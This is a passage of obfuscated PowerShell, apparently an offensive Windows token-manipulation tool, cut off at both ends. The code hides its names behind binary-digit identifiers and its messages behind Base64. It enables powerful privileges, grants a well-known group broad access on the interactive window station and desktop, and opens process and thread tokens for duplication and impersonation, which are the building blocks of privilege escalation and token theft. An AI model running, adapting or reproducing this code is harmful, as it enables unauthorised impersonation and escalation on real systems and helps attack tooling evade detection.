        ${11000001101111010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00001110011111111}, ${10010101010101000})
    ${00101100110110101} = _01100001000111010 secur32.dll LsaFreeReturnBuffer
        ${01100100101001011} = _00000111101100101 @([IntPtr]) ([UInt32])
        ${01101000110100010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101100110110101}, ${01100100101001011})
    ${01101111100010100} = _01100001000111010 kernel32.dll OpenThread
        ${10110011011110100} = _00000111101100101 @([UInt32], [Bool], [UInt32]) ([IntPtr])
        ${00101101100111011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01101111100010100}, ${10110011011110100})
    ${01111011101011111} = _01100001000111010 advapi32.dll OpenThreadToken
        ${00000100101100011} = _00000111101100101 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${01001101000101110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01111011101011111}, ${00000100101100011})
    ${01110000111001010} = _01100001000111010 advapi32.dll CreateProcessAsUserW
        ${00000110100001011} = _00000111101100101 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
        ${10011110011111100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01110000111001010}, ${00000110100001011})
    ${10111010010000100} = _01100001000111010 user32.dll OpenWindowStationW
    ${01110100011000101} = _00000111101100101 @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ${00000001011001001} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10111010010000100}, ${01110100011000101})
    ${00110001011001101} = _01100001000111010 user32.dll OpenDesktopA
    ${01010000101010000} = _00000111101100101 @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    ${00001111111000100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110001011001101}, ${01010000101010000})
    ${00101010000101010} = _01100001000111010 Advapi32.dll ImpersonateSelf
    ${10101110001011110} = _00000111101100101 @([Int32]) ([Bool])
    ${10011110011110101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101010000101010}, ${10101110001011110})
    ${00110111001000001} = _01100001000111010 Advapi32.dll LookupPrivilegeValueA
    ${00000010000111100} = _00000111101100101 @([String], [String], ${00101000100001011}.MakeByRefType()) ([Bool])
    ${11000000101011110} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00110111001000001}, ${00000010000111100})
    ${01001100010101011} = _01100001000111010 Advapi32.dll AdjustTokenPrivileges
    ${00000001110000101} = _00000111101100101 @([IntPtr], [Bool], ${01010011001011000}.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    ${11000000100010010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001100010101011}, ${00000001110000101})
    ${10001001011010010} = _01100001000111010 kernel32.dll GetCurrentThread
    ${01100001111010100} = _00000111101100101 @() ([IntPtr])
    ${00101100100100100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10001001011010010}, ${01100001111010100})
    ${01101000111111001} = _01100001000111010 advapi32.dll GetSecurityInfo
    ${10101101110010111} = _00000111101100101 @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    ${01110001111011010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01101000111111001}, ${10101101110010111})
    ${10101110111101011} = _01100001000111010 advapi32.dll SetSecurityInfo
    ${10011110000011010} = _00000111101100101 @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${01000001111111100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101110111101011}, ${10011110000011010})
    ${10111000110011001} = _01100001000111010 advapi32.dll GetAce
    ${01111011001100101} = _00000111101100101 @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    ${01100001011010010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10111000110011001}, ${01111011001100101})
    ${10100111011010001} = _01100001000111010 advapi32.dll LookupAccountSidW
    ${10001111100111101} = _00000111101100101 @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    ${10110101111101111} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10100111011010001}, ${10001111100111101})
    ${01100001000011001} = _01100001000111010 advapi32.dll AddAccessAllowedAce
    ${10001011101000110} = _00000111101100101 @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ${10100000000110010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01100001000011001}, ${10001011101000110})
    ${00101000011111001} = _01100001000111010 advapi32.dll CreateWellKnownSid
    ${01000010110110110} = _00000111101100101 @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ${00011010101101010} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00101000011111001}, ${01000010110110110})
    ${00000001111001111} = _01100001000111010 advapi32.dll SetEntriesInAclW
    ${01010001101010110} = _00000111101100101 @([UInt32], ${00011100000101100}.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    ${01011010110001100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${00000001111001111}, ${01010001101010110})
    ${01011101100010110} = _01100001000111010 kernel32.dll LocalFree
    ${11000000111111100} = _00000111101100101 @([IntPtr]) ([IntPtr])
    ${10101000011111000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01011101100010110}, ${11000000111111100})
    ${01001111110010100} = _01100001000111010 advapi32.dll LookupPrivilegeNameW
    ${10011110100100100} = _00000111101100101 @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ${10110110010111011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01001111110010100}, ${10011110100100100})
    Function _00000011000000010
        {
                Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Int64]
                ${_00100101001101000},
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                ${_00001000111000101}
                )
                [Byte[]]${01011110010010001} = [BitConverter]::GetBytes(${_00100101001101000})
                [Byte[]]${10100001101111100} = [BitConverter]::GetBytes(${_00001000111000101})
                [Byte[]]${01010001000111110} = [BitConverter]::GetBytes([UInt64]0)
                if (${01011110010010001}.Count -eq ${10100001101111100}.Count)
                {
                        ${10011110011100111} = 0
                        for (${10001001010101000} = 0; ${10001001010101000} -lt ${01011110010010001}.Count; ${10001001010101000}++)
                        {
                                [UInt16]${01110100101010101} = ${01011110010010001}[${10001001010101000}] + ${10100001101111100}[${10001001010101000}] + ${10011110011100111}
                                ${01010001000111110}[${10001001010101000}] = ${01110100101010101} -band 0x00FF
                                if ((${01110100101010101} -band 0xFF00) -eq 0x100)
                                {
                                        ${10011110011100111} = 1
                                }
                                else
                                {
                                        ${10011110011100111} = 0
                                }
                        }
                }
                else
                {
                        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
                }
                return [BitConverter]::ToInt64(${01010001000111110}, 0)
        }
    function Enable-SeAssignPrimaryTokenPrivilege
    {
            [IntPtr]${00010001100100100} = ${00101100100100100}.Invoke()
            if (${00010001100100100} -eq [IntPtr]::Zero)
            {
                    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
            }
            [IntPtr]${10011001000101011} = [IntPtr]::Zero
            [Bool]${10010100000110110} = ${01001101000101110}.Invoke(${00010001100100100}, ${01101010111011110}.TOKEN_QUERY -bor ${01101010111011110}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10011001000101011})
        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${10010100000110110} -eq $false)
            {
                    if (${01110010101100000} -eq ${01101010111011110}.ERROR_NO_TOKEN)
                    {
                            ${10010100000110110} = ${10011110011110101}.Invoke(${01101010111011110}.SECURITY_DELEGATION)
                            if (${10010100000110110} -eq $false)
                            {
                                    Throw (New-Object ComponentModel.Win32Exception)
                            }
                            ${10010100000110110} = ${01001101000101110}.Invoke(${00010001100100100}, ${01101010111011110}.TOKEN_QUERY -bor ${01101010111011110}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10011001000101011})
                            if (${10010100000110110} -eq $false)
                            {
                                    Throw (New-Object ComponentModel.Win32Exception)
                            }
                    }
                    else
                    {
                            Throw ([ComponentModel.Win32Exception] ${01110010101100000})
                    }
            }
        ${11000001101111010}.Invoke(${00010001100100100}) | Out-Null
        ${10110011111011011} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${00101000100001011})
        ${01001001101001101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10110011111011011})
        ${00000000011101010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001001101001101}, [Type]${00101000100001011})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01001001101001101})
            ${10010100000110110} = ${11000000101011110}.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEEAcwBzAGkAZwBuAFAAcgBpAG0AYQByAHkAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAA=='))), [Ref] ${00000000011101010})
            if (${10010100000110110} -eq $false)
            {
                    Throw (New-Object ComponentModel.Win32Exception)
            }
        [UInt32]${10000011100101010} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${10011001101111011})
        ${00100010100101000} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000011100101010})
        ${01110100101111111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00100010100101000}, [Type]${10011001101111011})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00100010100101000})
        ${01110100101111111}.Luid = ${00000000011101010}
        ${01110100101111111}.Attributes = ${01101010111011110}.SE_PRIVILEGE_ENABLED
        [UInt32]${00000011101101100} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${01010011001011000})
        ${10111001010011110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00000011101101100})
        ${01110101101101111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111001010011110}, [Type]${01010011001011000})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10111001010011110})
            ${01110101101101111}.PrivilegeCount = 1
            ${01110101101101111}.Privileges = ${01110100101111111}
        ${Global:00110101010001111} = ${01110101101101111}
            ${10010100000110110} = ${11000000100010010}.Invoke(${10011001000101011}, $false, [Ref] ${01110101101101111}, ${00000011101101100}, [IntPtr]::Zero, [IntPtr]::Zero)
            if (${10010100000110110} -eq $false)
            {
            Throw (New-Object ComponentModel.Win32Exception)
            }
        ${11000001101111010}.Invoke(${10011001000101011}) | Out-Null
    }
    function _00010111111111101
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            ${_10010100001010000}
        )
            [IntPtr]${00010001100100100} = ${00101100100100100}.Invoke()
            if (${00010001100100100} -eq [IntPtr]::Zero)
            {
                    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
            }
            [IntPtr]${10011001000101011} = [IntPtr]::Zero
            [Bool]${10010100000110110} = ${01001101000101110}.Invoke(${00010001100100100}, ${01101010111011110}.TOKEN_QUERY -bor ${01101010111011110}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10011001000101011})
        ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${10010100000110110} -eq $false)
            {
                    if (${01110010101100000} -eq ${01101010111011110}.ERROR_NO_TOKEN)
                    {
                            ${10010100000110110} = ${10011110011110101}.Invoke(${01101010111011110}.SECURITY_DELEGATION)
                            if (${10010100000110110} -eq $false)
                            {
                                    Throw (New-Object ComponentModel.Win32Exception)
                            }
                            ${10010100000110110} = ${01001101000101110}.Invoke(${00010001100100100}, ${01101010111011110}.TOKEN_QUERY -bor ${01101010111011110}.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${10011001000101011})
                            if (${10010100000110110} -eq $false)
                            {
                                    Throw (New-Object ComponentModel.Win32Exception)
                            }
                    }
                    else
                    {
                            Throw ([ComponentModel.Win32Exception] ${01110010101100000})
                    }
            }
        ${11000001101111010}.Invoke(${00010001100100100}) | Out-Null
        ${10110011111011011} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${00101000100001011})
        ${01001001101001101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10110011111011011})
        ${00000000011101010} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001001101001101}, [Type]${00101000100001011})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01001001101001101})
            ${10010100000110110} = ${11000000101011110}.Invoke($null, ${_10010100001010000}, [Ref] ${00000000011101010})
            if (${10010100000110110} -eq $false)
            {
                    Throw (New-Object ComponentModel.Win32Exception)
            }
        [UInt32]${10000011100101010} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${10011001101111011})
        ${00100010100101000} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10000011100101010})
        ${01110100101111111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00100010100101000}, [Type]${10011001101111011})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00100010100101000})
        ${01110100101111111}.Luid = ${00000000011101010}
        ${01110100101111111}.Attributes = ${01101010111011110}.SE_PRIVILEGE_ENABLED
        [UInt32]${00000011101101100} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${01010011001011000})
        ${10111001010011110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00000011101101100})
        ${01110101101101111} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${10111001010011110}, [Type]${01010011001011000})
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10111001010011110})
            ${01110101101101111}.PrivilegeCount = 1
            ${01110101101101111}.Privileges = ${01110100101111111}
        ${Global:00110101010001111} = ${01110101101101111}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGUAbgBhAGIAbABlACAAcAByAGkAdgBpAGwAZQBnAGUAOgAgACQAewBfADEAMAAwADEAMAAxADAAMAAwADAAMQAwADEAMAAwADAAMAB9AA==')))
            ${10010100000110110} = ${11000000100010010}.Invoke(${10011001000101011}, $false, [Ref] ${01110101101101111}, ${00000011101101100}, [IntPtr]::Zero, [IntPtr]::Zero)
            if (${10010100000110110} -eq $false)
            {
            Throw (New-Object ComponentModel.Win32Exception)
            }
        ${11000001101111010}.Invoke(${10011001000101011}) | Out-Null
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAZAAgAHAAcgBpAHYAaQBsAGUAZwBlADoAIAAkAHsAXwAxADAAMAAxADAAMQAwADAAMAAwADEAMAAxADAAMAAwADAAfQA=')))
    }
    function _10100110100010000
    {
        _00010111111111101 -_10010100001010000 SeSecurityPrivilege
        ${01110000101001100} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwB0AGEAMAA='))))
        ${00000011001100011} = ${00000001011001001}.Invoke(${01110000101001100}, $false, ${01101010111011110}.ACCESS_SYSTEM_SECURITY -bor ${01101010111011110}.READ_CONTROL -bor ${01101010111011110}.WRITE_DAC)
        if (${00000011001100011} -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        _00011000011111110 -_00010101110111011 ${00000011001100011}
        ${11000001101111010}.Invoke(${00000011001100011}) | Out-Null
        ${01111010101100101} = ${00001111111000100}.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAGYAYQB1AGwAdAA='))), 0, $false, ${01101010111011110}.DESKTOP_GENERIC_ALL -bor ${01101010111011110}.WRITE_DAC)
        if (${01111010101100101} -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }
        _00011000011111110 -_00010101110111011 ${01111010101100101}
        ${11000001101111010}.Invoke(${01111010101100101}) | Out-Null
    }
    function _00011000011111110
    {
        Param(
            [IntPtr]${_00010101110111011}
            )
        [IntPtr]${00000111000001011} = [IntPtr]::Zero
        [IntPtr]${01001100010110110} = [IntPtr]::Zero
        [IntPtr]${00100110100010111} = [IntPtr]::Zero
        [IntPtr]${00111111110100100} = [IntPtr]::Zero
        [IntPtr]${01110010110101101} = [IntPtr]::Zero
        ${10011100001100011} = ${01110001111011010}.Invoke(${_00010101110111011}, 0x7, ${01101010111011110}.DACL_SECURITY_INFORMATION, [Ref]${00000111000001011}, [Ref]${01001100010110110}, [Ref]${00100110100010111}, [Ref]${00111111110100100}, [Ref]${01110010110101101})
        if (${10011100001100011} -ne 0)
        {
            Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAARwBlAHQAUwBlAGMAdQByAGkAdAB5AEkAbgBmAG8ALgAgAEUAcgByAG8AcgBDAG8AZABlADoAIAAkAHsAMQAwADAAMQAxADEAMAAwADAAMAAxADEAMAAwADAAMQAxAH0A')))
        }
        if (${00100110100010111} -ne [IntPtr]::Zero)
        {
            ${01111110001001000} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00100110100010111}, [Type]${00110101111001010})
            [UInt32]${10111000100000001} = 2000
            ${00110100000010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10111000100000001})
            ${10101100100110000} = ${00011010101101010}.Invoke(1, [IntPtr]::Zero, ${00110100000010101}, [Ref]${10111000100000001})
            if (-not ${10101100100110000})
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }
            ${01000111010010110} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${01000000011011101})
            ${01001000110001111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01000111010010110})
            ${10111110100000100} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${01001000110001111}, [Type]${01000000011011101})
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${01001000110001111})
            ${10111110100000100}.pMultipleTrustee = [IntPtr]::Zero
            ${10111110100000100}.MultipleTrusteeOperation = 0
            ${10111110100000100}.TrusteeForm = ${01101010111011110}.TRUSTEE_IS_SID
            ${10111110100000100}.TrusteeType = ${01101010111011110}.TRUSTEE_IS_WELL_KNOWN_GROUP
            ${10111110100000100}.ptstrName = ${00110100000010101}
            ${10101010101001011} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${00011100000101100})
            ${00011100101110101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${10101010101001011})
            ${10000100001111001} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00011100101110101}, [Type]${00011100000101100})
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00011100101110101})
            ${10000100001111001}.grfAccessPermissions = 0xf03ff
            ${10000100001111001}.grfAccessMode = ${01101010111011110}.GRANT_ACCESS
            ${10000100001111001}.grfInheritance = ${01101010111011110}.OBJECT_INHERIT_ACE
            ${10000100001111001}.Trustee = ${10111110100000100}
            [IntPtr]${10101100011110100} = [IntPtr]::Zero
            ${10011100001100011} = ${01011010110001100}.Invoke(1, [Ref]${10000100001111001}, ${00100110100010111}, [Ref]${10101100011110100})
            if (${10011100001100011} -ne 0)
            {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBhAGwAbABpAG4AZwAgAFMAZQB0AEUAbgB0AHIAaQBlAHMASQBuAEEAYwBsAFcAOgAgACQAewAxADAAMAAxADEAMQAwADAAMAAwADEAMQAwADAAMAAxADEAfQA=')))
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${00110100000010101})
            if (${10101100011110100} -eq [IntPtr]::Zero)
            {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABEAEEAQwBMACAAaQBzACAAbgB1AGwAbAA=')))
            }
            ${10011100001100011} = ${01000001111111100}.Invoke(${_00010101110111011}, 0x7, ${01101010111011110}.DACL_SECURITY_INFORMATION, ${00000111000001011}, ${01001100010110110}, ${10101100011110100}, ${00111111110100100})
            if (${10011100001100011} -ne 0)
            {
                Write-Error $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwBlAGMAdQByAGkAdAB5AEkAbgBmAG8AIABmAGEAaQBsAGUAZAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewAxADAAMAAxADEAMQAwADAAMAAwADEAMQAwADAAMAAxADEAfQA=')))
            }
            ${10101000011111000}.Invoke(${01110010110101101}) | Out-Null
        }
    }
    function _00101000101010010
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,
            [Parameter()]
            [Switch]
            ${_00001000010100010}
        )
        if (${_00001000010100010})
        {
            ${00100101110000010} = ${01101010111011110}.TOKEN_ALL_ACCESS
        }
        else
        {
            ${00100101110000010} = ${01101010111011110}.TOKEN_ASSIGN_PRIMARY -bor ${01101010111011110}.TOKEN_DUPLICATE -bor ${01101010111011110}.TOKEN_IMPERSONATE -bor ${01101010111011110}.TOKEN_QUERY
        }
        ${00100100101011110} = New-Object PSObject
        ${00101011100100100} = ${01111111001000101}.Invoke(${01101010111011110}.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        ${00100100101011110} | Add-Member -MemberType NoteProperty -Name hProcess -Value ${00101011100100100}
        if (${00101011100100100} -eq [IntPtr]::Zero)
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error code: ${01110010101100000} . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]${00111011101010110} = [IntPtr]::Zero
            ${10101100100110000} = ${10100000011011100}.Invoke(${00101011100100100}, ${00100101110000010}, [Ref]${00111011101010110})
            if (-not ${11000001101111010}.Invoke(${00101011100100100}))
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIABwAHIAbwBjAGUAcwBzACAAaABhAG4AZABsAGUALAAgAHQAaABpAHMAIABpAHMAIAB1AG4AZQB4AHAAZQBjAHQAZQBkAC4AIABFAHIAcgBvAHIAQwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMAAwADEAMAAxADAAMQAxADAAMAAwADAAMAB9AA==')))
            }
            ${00101011100100100} = [IntPtr]::Zero
            if (${10101100100110000} -eq $false -or ${00111011101010110} -eq [IntPtr]::Zero)
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error: ${01110010101100000}"
                return $null
            }
            else
            {
                ${00100100101011110} | Add-Member -MemberType NoteProperty -Name hProcToken -Value ${00111011101010110}
            }
        }
        return ${00100100101011110}
    }
    function _01000101001101000
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )
        ${00100101110000010} = ${01101010111011110}.TOKEN_ALL_ACCESS
        ${00101111010001111} = New-Object PSObject
        [IntPtr]${00010010101111011} = [IntPtr]::Zero
        ${00001010011100101} = ${00101101100111011}.Invoke(${01101010111011110}.THREAD_ALL_ACCESS, $false, $ThreadId)
        if (${00001010011100101} -eq [IntPtr]::Zero)
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${01110010101100000} -ne ${01101010111011110}.ERROR_INVALID_PARAMETER) 
            {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABvAHAAZQBuACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGYAbwByACAAVABoAHIAZQBhAGQASQBkADoAIAAkAFQAaAByAGUAYQBkAEkAZAAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7ADAAMQAxADEAMAAwADEAMAAxADAAMQAxADAAMAAwADAAMAB9AA==')))
            }
        }
        else
        {
            ${10101100100110000} = ${01001101000101110}.Invoke(${00001010011100101}, ${00100101110000010}, $false, [Ref]${00010010101111011})
            if (-not ${10101100100110000})
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ((${01110010101100000} -ne ${01101010111011110}.ERROR_NO_TOKEN) -and  
                 (${01110010101100000} -ne ${01101010111011110}.ERROR_INVALID_PARAMETER)) 
                {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGEAbABsACAATwBwAGUAbgBUAGgAcgBlAGEAZABUAG8AawBlAG4AIABmAG8AcgAgAFQAaAByAGUAYQBkAEkAZAA6ACAAJABUAGgAcgBlAGEAZABJAGQALgAgAEUAcgByAG8AcgAgAGMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
                }
            }
            else
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABxAHUAZQByAGkAZQBkACAAdABoAHIAZQBhAGQAIAB0AG8AawBlAG4A')))
            }
            if (-not ${11000001101111010}.Invoke(${00001010011100101}))
            {
                ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbABlAGQAIAB0AG8AIABjAGwAbwBzAGUAIAB0AGgAcgBlAGEAZAAgAGgAYQBuAGQAbABlACwAIAB0AGgAaQBzACAAaQBzACAAdQBuAGUAeABwAGUAYwB0AGUAZAAuACAARQByAHIAbwByAEMAbwBkAGUAOgAgACQAewAwADEAMQAxADAAMAAxADAAMQAwADEAMQAwADAAMAAwADAAfQA=')))
            }
            ${00001010011100101} = [IntPtr]::Zero
        }
        ${00101111010001111} | Add-Member -MemberType NoteProperty -Name hThreadToken -Value ${00010010101111011}
        return ${00101111010001111}
    }
    function _01000101000011000
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            ${_10111010100010000}
        )
        ${10100111101000110} = $null
        ${00110101101001111} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${10100110011010111})
        [IntPtr]${10100000010010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${00110101101001111})
        [UInt32]${10111000100000001} = 0
        ${10101100100110000} = ${00000001010001110}.Invoke(${_10111010100010000}, ${10010010001100101}::TokenStatistics, ${10100000010010101}, ${00110101101001111}, [Ref]${10111000100000001})
        if (-not ${10101100100110000})
        {
            ${01110010101100000} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
